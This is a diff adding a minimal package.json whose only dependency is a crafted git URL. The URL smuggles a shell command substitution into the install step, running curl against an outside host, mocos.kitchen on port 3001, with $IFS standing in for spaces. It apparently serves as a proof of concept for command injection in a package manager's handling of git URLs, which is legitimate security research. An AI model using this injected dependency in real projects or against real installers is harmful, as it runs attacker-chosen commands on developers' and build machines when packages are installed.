@@ -1,0 +1,10 @@
+{
+  "name": "javascript",
+  "version": "1.0.0",
+  "main": "index.js",
+  "license": "MIT",
+  "private": true,
+  "dependencies": {
+    "tyage-sample-package": "https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/github.com/tyage/sample-package.git#semver:4.0.0"
+  }
+}
